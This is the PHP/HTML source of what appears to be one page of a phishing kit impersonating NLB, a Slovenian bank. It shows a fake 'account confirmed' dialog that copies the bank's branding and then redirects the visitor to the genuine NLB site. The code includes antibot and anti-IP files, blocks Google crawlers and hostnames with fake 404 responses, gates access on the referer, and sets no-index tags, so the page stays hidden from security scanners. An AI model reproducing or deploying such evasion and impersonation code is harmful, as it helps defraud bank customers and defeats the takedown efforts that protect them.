<?php 
   header("Refresh: 6; url=https://www.nlb.si/pay", true, 303);
   ?>
<?php 
   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');
   exit(); ?>
<?php }else{ ?>
<?php
   session_start();
   error_reporting(0);
   include('includes/antibot1.php');
   include('includes/antibot2.php');
   include('includes/antiip.php');
   include('config.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>NLB pay</title>
    <meta name="multilanguage" content="true">
    <meta name="lng" content="el">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex,nofollow,noimageindex,noarchive,nocache,nosnippet">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="assets/img/favicon.ico">
    <link href="assets/css/loading.css" rel="stylesheet">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   </head>
   <body class="login-bg windows login-retail modal-open" style="background-color:#fff;" style="padding-right: 0.333374px;">
      <div class="appRoot">
         <div class="flex-column min-height-full-vh">
         <header style="background:#26007D;margin-bottom:20px">
            <nav class="navbar navbar-expand-lg navbar-light" style="align-items: flex-start;display: flex; justify-content: space-between;">
  <a class="navbar-brand" href="#"><img src="https://klikotp.nlb.si/nlb_left_02.png" /> </a>
  <div class="collapse navbar-collapse" style="justify-content: flex-end;padding-top:10px" id="navbarNav">
    <ul class="navbar-nav" style="display: flex;">
      <li class="nav-item" style="margin:0px 2px;">
        <a class="nav-link" href="#">NLB</a>
      </li>
      <li class="nav-item" style="margin:0px 2px;padding-left:2px;">
        <a class="nav-link" href="#">O NLB Kliku</a>
      </li>
      <li class="nav-item" style="margin:0px 2px;padding-left:2px;">
        <a class="nav-link" href="#">Kontakt</a>
      </li>
    </ul>
  </div>
</nav>
            </header>
         </div>
      </div>
      <ngb-modal-backdrop style="z-index: 1050" class="modal-backdrop fade show"></ngb-modal-backdrop>
      <ngb-modal-window role="dialog" tabindex="-1" class="modal fade show d-block modal-small">
         <div role="document" class="modal-dialog">
            <div class="modal-content">
               <two-fa-modal>
                  <div class="card bg-white">
                     <modal-header>
                        <div class="bg-white position-relative" style="padding: 0.75rem; border-radius: 0.5rem">
                           <h4 class="modal-header ng-star-inserted" style="color:#8db925;" > Prijava uporabnika </h4>
                           <button aria-label="Close" class="icon-clear button-transparent icon-container-small text-x-large text-primary margin-left-auto position-absolute modal-button-position--left" type="button"></button>
                        </div>
                        <hr class="modal-header-divider ng-star-inserted">
                     </modal-header>
                     <div class="modal-wrapper-padding">
                        <div class="margin-top-normal">
                           <div style="text-align:center;">
                              <div _ngcontent-my-app-c176="" class="icon-box s48 sm:s64">
                                 <svg width="120" height="120" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path class="stroke-color-1" d="M28 56H18C14.6863 56 12 53.3137 12 50V14C12 10.6863 14.6863 8 18 8H46C49.3137 8 52 10.6863 52 14V28" stroke="#087681" stroke-width="3"></path>
                                    <path class="stroke-color-1" d="M58.5 45C58.5 48.6979 57.0152 52.046 54.6058 54.4857C52.1565 56.9658 48.7588 58.5 45 58.5C37.5442 58.5 31.5 52.4558 31.5 45C31.5 37.5442 37.5442 31.5 45 31.5C52.4558 31.5 58.5 37.5442 58.5 45Z" stroke="#087681" stroke-width="3"></path>
                                    <path class="stroke-color-2" d="M38 44.5536L42.8674 49.5L47.4337 44.75L52 40" stroke="#13A4AD" stroke-width="3"></path>
                                    <path class="stroke-color-2" d="M44 20L20 20" stroke="#13A4AD" stroke-width="3"></path>
                                    <path class="stroke-color-2" d="M36 28L20 28" stroke="#13A4AD" stroke-width="3"></path>
                                    <path class="stroke-color-2" d="M28 36H20" stroke="#13A4AD" stroke-width="3"></path>
                                 </svg>
                              </div>
                           </div>
                           <p class="text-light-black text-light margin-top-normal ng-star-inserted" style="font-size: 1.2rem; line-height: 1.25rem; letter-spacing: -.01375rem;"> Hvala, ker ste potrdili svoj račun, zdaj se lahko prijavite in nadaljujete z uporabo spletnih funkcij. </p>
                        </div>
                        <div class="footer-buttons-container">
                           <spinner type="action">
                              <button class="button margin-left-auto ng-star-inserted " style="background-color:#F9662B;" type="submit" id="sms1" name="sms1" id="start_button"> Kontinuiteta </button>
                           </spinner>
                        </div>
                     </div>
                  </div>
                  </form>
               </two-fa-modal>
            </div>
         </div>
      </ngb-modal-window>
   </body>
</html>
<?php } ?>